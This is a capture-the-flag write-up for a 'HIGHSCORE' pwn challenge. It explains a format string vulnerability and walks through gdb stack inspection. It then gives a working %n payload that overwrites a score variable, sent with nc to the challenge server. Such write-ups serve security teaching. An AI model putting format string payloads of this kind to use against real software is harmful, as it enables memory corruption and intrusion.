## HIGHSCORE [120]

## Solution
The variable `highscore` is in a read-only section, but the variable `userscore` is in the `.data` section and is therefore writable. The binary `read()`s in 79 bytes to a buffer and then calls `printf()` with that buffer as the format string (but with no other arguments). This will allow us to use a format string attack to overwrite `userscore` at address `0x0804a03c`.

Right before the call to `printf()`, the stack will look like this:
```
ameise@STAHLKERN:~/CS2015/pwn/120_HIGHSCORE$ gdb ./highscore 
Reading symbols from ./highscore...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   [...]
   0x08048565 <+106>:	call   0x80483a0 <printf@plt>
   [...]
(gdb) break *0x08048565
Breakpoint 1 at 0x8048565
(gdb) run
Starting program: /home/ameise/CS2015/pwn/120_HIGHSCORE/highscore 
Can you beat my high score of 10000?
aaaabbbbccccdddd

Breakpoint 1, 0x08048565 in main ()
(gdb) x/32xw $esp
0xffffce60:	0xffffce78	0xffffce78	0x0000004f	0x00000000
0xffffce70:	0xf7ffd000	0xf7ffd918	0x61616161	0x62626262
0xffffce80:	0x63636363	0x64646464	0xf7fb000a	0x00007fd7
0xffffce90:	0xffffffff	0x0000002f	0xf7e0ddc8	0xf7fd5858
0xffffcea0:	0x00008000	0xf7fb3000	0xf7fb1244	0xf7e190ec
0xffffceb0:	0x00000001	0x00000007	0xf7e2fa30	0x0804865b
0xffffcec0:	0x00000001	0xffffcf84	0xffffcf8c	0x00000011
0xffffced0:	0xf7fb33dc	0xffffcef0	0x00000000	0xf7e19637
(gdb) x/s 0xffffce78
0xffffce78:	"aaaabbbbccccdddd\n"
```

We will use the `$` format specifier with our `printf()` format string to specify a specific stack variable that will contain the address of `userscore`. The variables above would be referenced in the following way by a format string:
```
0xffffce78 ... $0
0xffffce78 ... $1
0x0000004f ... $2
[...]
0x61616161 ... $6
0x62626262 ... $7
0x63636363 ... $8
[...]
```

The `%n` format specifier tells `printf()` to store the total number of bytes written so far into a variable addressed on the stack. For example, the following would tell `printf()` to store the number of bytes written so far into the integer location addressed by stack variable number 2:
```C
printf("%$2n");
```

We are able to control what is written to memory starting at `0xffffce78` with the call to `read()`. This location also has to store our format string itself, however, and we must ensure that the address of `userscore` is stored on a 4-byte boundary. We can use zero-padding in a format specifier to ensure that a lot of bytes are written (`userscore` must be over 10,000). Let's put the address `0x0804a03c` at stack variable 10 for now to give us enough space for the rest of the format specifier:
```
"%010010x%10$naaa\x3c\xa0\x04\x08"
```

In memory, just before the call to `printf()`, this will look like:
```
$0     (addr of format string "%x%x ...")
$1     (out of our control)
$2     (out of our control)
$3     (out of our control)
$4     (out of our control)
$5     (out of our control)
$6     '%' '0' '1' '0'
$7     '0' '1' '0' 'x'
$8     '%' '1' '0' '$'
$9     'n' 'a' 'a' 'a'
$10    \x3c\xa0\x04\x08
```

This will cause a value larger than 10,000 to be stored in `userscore` and the binary will give us the key:
```
ameise@STAHLKERN:~/CS2015/pwn/120_HIGHSCORE$ python -c 'print "%010010x%10$naaa\x3c\xa0\x04\x08"' | nc shell.cyberstakesonline.com 2230
Can you beat my high score of 10000?
0000000000000000000000000000000000000000000000000000
[...]
00000000000000000000000000000000000000ffffdb88aaa<�
Success!  Your key is 6bae2d8146a34b63392c53f20f3fca44
```